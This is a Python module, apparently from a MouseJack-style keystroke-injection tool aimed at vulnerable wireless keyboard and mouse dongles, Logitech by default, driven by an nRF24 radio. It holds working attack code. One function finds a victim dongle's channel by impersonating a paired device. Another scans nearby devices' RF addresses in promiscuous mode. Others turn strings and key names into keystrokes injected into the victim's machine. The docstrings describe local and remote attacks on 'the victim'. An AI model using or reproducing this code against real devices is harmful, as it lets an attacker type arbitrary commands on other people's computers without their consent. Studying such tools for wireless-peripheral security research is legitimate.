"""
This file contains utilities and functionalities common to all vendors,
including scanning, channel sweeping and generic attack functions.
"""

# no problem doing relative imports since this file should not be executed
from .hid_scan_codes import *
from . import logitech
import time

PING_PAYLOAD = [0x0F, 0x0F, 0x0F, 0x0F]

def find_frequency_channel(radio, address):
    """
    This function receives a radio parameter (can either be a RadioServer for remote attack, or nrf24 for local attack)
    and an RF address of a vulnerable device. It identifies the frequency channel used by the victim dongle to communicate with that device,
    by pretending to be that device (since we have its address), and repeatedly sending an arbitrary "ping" payload to the victim dongle, using a different channel each time.
    The function continues with this process until an ACK is received from the dongle, meaning we found the right channel.
    It returns the channel if one was found, and None otherwise.
    This step has to be performed before any attack, since the attacking dongle must be on the same channel as the victim dongle in order to communicate with it.
    """

    print('pinging...')

    # We need to enter sniffer mode because this is the only way to tell the attacking dongle which address to use
    # when transmitting a payload. Note that this has nothing to do with sniffing keystrokes for keylogging purposes.
    radio.enter_sniffer_mode(address)
    
    # The nRF24LU1 chip provides 126 channels of 1MHz from 2400MHz to 2525MHz, so the channel parameter can be between 0 and 125 (inclusive).
    # But we don't need to scan all of these channels - the MouseJack whitepaper contains a Radio Configuration table for each affected vendor.
    # The tables contain the range of channels used by each vendor. The smallest used frequency among all vendors is 2402, and the greatest one
    # is 2481. So we can expect the channels to be between 2 and 81, thus reducing scanning time (for Logitech Unifying, the bound is even tighter -
    # 2402 - 2474).
    # To be more safe, an upper bound of 84 is used, based on: https://github.com/BastilleResearch/nrf-research-firmware/blob/master/tools/lib/common.py#L33
    for channel in range(2, 84):
        radio.set_channel(channel)
        if radio.transmit_payload(PING_PAYLOAD): # transmitting the payload; the function returns true if a response was received
            print(f'found channel: {channel}')
            return channel
    return None

def add_key_releases(keystrokes):
    """
    This function receives a list of keystrokes (meaning a list where each element is a list of the form: [scan_code, modifier])
    that are about to be injected to a vulnerable dongle.
    It tries to find consecutive pairs of keystrokes (meaning, one is to be transmitted immediately after the other) that are identical.
    In this case, that same keystroke will not be typed twice unless a key release packet is placed between the original two.
    So this function adds key release packets wherever necessary.
    """
    new_keystrokes = []
    for i in range(len(keystrokes) - 1): # in order to not go out of range
        new_keystrokes.append(keystrokes[i]) # copying each keystroke from the original list
        if keystrokes[i] == keystrokes[i + 1]: # checking if the next keystroke is the same (has the same scan code and same modifier)
            new_keystrokes.append([KEY_RELEASE, KEY_MOD_NONE]) # adding a key release 
    new_keystrokes.append(keystrokes[-1]) # copying the last keystroke
    return new_keystrokes

def transmit_string(radio, s, vendor=logitech):
    """
    This function receives a radio parameter (can either be a RadioServer for remote attack, or nrf24 for local attack),
    a string to be injected and the vendor of the vulnerable device. It injects the string to the victim.
    """
    keystrokes = [printable_characters[char] for char in s] # using the printable_characters dictionary from hid_scan_codes.py to get a list of keystrokes matching the characters
    vendor.inject_keystrokes(radio, add_key_releases(keystrokes)) # calling the vendor's function to inject keystrokes, adding key release packets using the utility function if necessary

def transmit_keys(radio, keys, vendor=logitech):
    """
    This function receives a radio parameter (can either be a RadioServer for remote attack, or nrf24 for local attack),
    a list of keys to be injected and the vendor of the vulnerable device. It injects the keys to the victim, one by one.
    Important note: only multimedia keys or keys that don't produce a character are allowed. For printable characters, use transmit_string().
    """
    keystrokes = [other_keys[name] for name in keys if name in other_keys.keys()] # using the other_keys dictionary (that's why characters are not allowed), eliminating key names that aren't in the dictionary
    vendor.inject_keystrokes(radio, add_key_releases(keystrokes)) # calling the vendor's function to inject keystrokes, adding key release packets using the utility function if necessary


def scan(radio, timeout=5.0):
    radio.enter_promiscuous_mode()
    channel = 2
    radio.set_channel(channel)
    dwell_time = 0.1
    last_tune = time.time()
    start_time = time.time()

    results_set = set() # create an empty Set to store results

    while time.time() - start_time < timeout:
        if  time.time() - last_tune > dwell_time:
            channel = ((channel + 1) % 83) if ((channel + 1) % 83) >= 2 else 2
            radio.set_channel(channel)
            last_tune = time.time()

        try:
            value = radio.receive_payload()
        except RuntimeError:
            value = []
        if len(value) >= 5:
            address, payload = value[0:5], value[5:]
            results_set.add((address, payload)) # add the address, payload pair to the Set
            print("ch: %02d addr: %s packet: %s" % (channel, to_display(address), to_display(payload)))


def start_scanning(radio):
    print('Scanning for signals...')
    try:
        while True:
            scan(radio, timeout=60)
    except KeyboardInterrupt:
        print('\n(^C) interrupted\n')
        print('[-] Quitting')

def to_display(data):
    return ':'.join('{:02X}'.format(x) for x in data)
